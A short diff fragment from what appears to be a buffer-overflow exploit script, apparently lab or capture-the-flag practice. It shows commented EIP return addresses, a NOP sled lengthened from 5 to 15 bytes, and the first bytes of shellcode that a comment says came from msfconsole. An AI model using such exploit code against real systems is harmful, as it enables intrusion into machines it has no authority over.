@@ -11,7 +11,7 @@ ________________________________________________________________________________
     #eip = "BBBB"
     #eip = "\x59\x3b\xde\xf7"
     
-    nop = '\x90' * 5
+    nop = '\x90' * 15
     
     buf =  b""                                                            #This is gotten from the msfconsole
     buf += b"\xd9\xc6\xba\x7b\x1d\x43\x22\xd9\x74\x24\xf4\x5e"            #commands that were ran below!!!!!!
